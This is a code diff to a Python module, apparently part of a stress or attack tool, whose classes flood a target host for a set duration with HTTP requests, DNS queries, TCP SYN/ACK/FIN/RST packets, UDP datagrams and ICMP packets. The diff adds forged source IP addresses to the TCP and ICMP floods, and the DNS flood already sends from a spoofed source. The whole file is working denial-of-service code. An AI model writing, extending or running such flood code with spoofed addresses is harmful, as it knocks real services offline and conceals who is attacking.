@@ -1,61 +1,54 @@
 import socket
 import random
 import string
-from typing import Optional, Dict
+import threading, time
 from contextlib import suppress
-from scapy.all import IP, TCP, UDP, ICMP, send
+from typing import Optional, Dict
 from scapy.layers.dns import DNS, DNSQR
 from datetime import datetime, timedelta
+from scapy.all import IP, TCP, UDP, ICMP, send
 
 from . import Endpoint, NetTools
 
-#  Layer 7 (Application) 
 class L7:
     def __init__(self, endpoint: Endpoint, duration: int = 30):
         self.endpoint: Endpoint = endpoint
         self.net_tools: NetTools = NetTools()
-        # Time until attack stops
         self.until = datetime.now() + timedelta(seconds=duration)
 
-    # Generate random payload for HTTP requests
     def _generate_payload(self, length: int = 256) -> str:
         return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
-    # Send a single TCP HTTP request repeatedly until duration ends
     def send_tcp_request(
         self,
         method: str = "GET",
         headers: Optional[Dict[str, str]] = None,
         body: str = "",
         body_len: int = 256,
-        spoofed_ip: str = None
+        spoofed_ip: str = None,
     ) -> None:
-        while (self.until - datetime.now()).total_seconds() > 0:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        with suppress(Exception):
+            while (self.until - datetime.now()).total_seconds() > 0:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(10)
                 if spoofed_ip:
                     s.bind((spoofed_ip, 0))
                 s.connect((self.endpoint.host, self.endpoint.port))
 
-                # Generate random body if needed
                 body = self._generate_payload(body_len)
                 req: bytes = self.net_tools.build_request(self.endpoint, method, body)
 
-                # Add extra headers if provided
                 if headers:
                     header_lines = "".join(f"{k}: {v}\r\n" for k, v in headers.items())
                     header_section = headers.encode() if isinstance(headers, bytes) else header_lines.encode()
                     req_parts = req.split(b"\r\n\r\n", 1)
                     if len(req_parts) == 2:
-                        req = req_parts[0] + b"\r\n" + header_section + b"\r\n\r\n" + req_parts[1]
+                            req = req_parts[0] + b"\r\n" + header_section + b"\r\n\r\n" + req_parts[1]
                     else:
                         req += header_section + b"\r\n\r\n"
-
-                # Send request and receive response
                 s.send(req)
                 s.recv(4096)
 
-    # HTTP methods mapped to send_tcp_request
     def GET(self, headers: Optional[Dict[str, str]] = None, body: str = "", body_len: int = 256, spoofed_ip: str = None) -> None:
         self.send_tcp_request("GET", headers, body, body_len, spoofed_ip)
 
@@ -71,7 +64,6 @@ class L7:
     def DELETE(self, headers: Optional[Dict[str, str]] = None, spoofed_ip: str = None) -> None:
         self.send_tcp_request("DELETE", headers, spoofed_ip=spoofed_ip)
 
-    # DNS flood attack
     def DNS(self, spoofed_ip: str, domain: str = "google.com", qtype: str = "A") -> None:
         with suppress(Exception):
             while (self.until - datetime.now()).total_seconds() > 0:
@@ -82,18 +74,17 @@ class L7:
                     verbose=0
                 )
 
-#  Layer 4 (Transport) 
 class L4:
     def __init__(self, endpoint: Endpoint, duration: int):
         self.endpoint: Endpoint = endpoint
+        self.net_tools: NetTools = NetTools()  # Added NetTools instance
         self.until = datetime.now() + timedelta(seconds=duration)
 
-    # Send a TCP packet with custom flags repeatedly
-    def _send_tcp_flag(self, flags: str) -> None:
-        with suppress(Exception):
+    def _send_tcp_flag(self, flags: str, spoofed_ip: str = None) -> None:
             while (self.until - datetime.now()).total_seconds() > 0:
+                src_ip = spoofed_ip or self.net_tools.generate_spoofed_ip()
                 send(
-                    IP(dst=self.endpoint.host) /
+                    IP(src=src_ip, dst=self.endpoint.host) /
                     TCP(
                         sport=random.randint(1024, 65535),
                         dport=self.endpoint.port,
@@ -102,34 +93,48 @@ class L4:
                     ),
                     verbose=0
                 )
+                time.sleep(0.01)  # Rate control
 
-    # TCP flag methods
-    def ACK(self) -> None: self._send_tcp_flag('A')
-    def SYN(self) -> None: self._send_tcp_flag('S')
-    def FIN(self) -> None: self._send_tcp_flag('F')
-    def RST(self) -> None: self._send_tcp_flag('R')
-    def TCP(self) -> None: self._send_tcp_flag(None)
+    def ACK(self, spoofed_ip: str = None) -> None:
+        self._send_tcp_flag('A', spoofed_ip)
 
-    # UDP flood
-    def UDP(self, message: bytes = b"hello") -> None:
+    def SYN(self, spoofed_ip: str = None) -> None:
+        self._send_tcp_flag('S', spoofed_ip)
+
+    def FIN(self, spoofed_ip: str = None) -> None:
+        self._send_tcp_flag('F', spoofed_ip)
+
+    def RST(self, spoofed_ip: str = None) -> None:
+        self._send_tcp_flag('R', spoofed_ip)
+
+    def TCP(self, spoofed_ip: str = None) -> None:
+        self._send_tcp_flag('S', spoofed_ip)  # Default to SYN for generic TCP
+
+    def UDP(self, message: bytes = b"hello", spoofed_ip: str = None) -> None:
         with suppress(Exception):
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(10)
+            if spoofed_ip:
+                s.bind((spoofed_ip, 0))
             while (self.until - datetime.now()).total_seconds() > 0:
-                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-                    s.sendto(message, (self.endpoint.host, self.endpoint.port))
+                s.sendto(message, (self.endpoint.host, self.endpoint.port))
+                time.sleep(0.01)  # Rate control
+            s.close()
 
-#  Layer 3 (Network) 
 class L3:
     def __init__(self, endpoint: Endpoint, duration: int):
         self.endpoint: Endpoint = endpoint
+        self.net_tools: NetTools = NetTools()  # Added NetTools instance
         self.until = datetime.now() + timedelta(seconds=duration)
 
-    # ICMP ping/flood
-    def ICMP(self, payload: bytes = b"payload") -> None:
+    def ICMP(self, payload: bytes = b"payload", spoofed_ip: str = None) -> None:
         with suppress(Exception):
             while (self.until - datetime.now()).total_seconds() > 0:
+                src_ip = spoofed_ip or self.net_tools.generate_spoofed_ip()
                 send(
-                    IP(dst=self.endpoint.host) /
+                    IP(src=src_ip, dst=self.endpoint.host) /
                     ICMP() /
                     payload,
                     verbose=0
                 )
+                time.sleep(0.01)  # Rate control
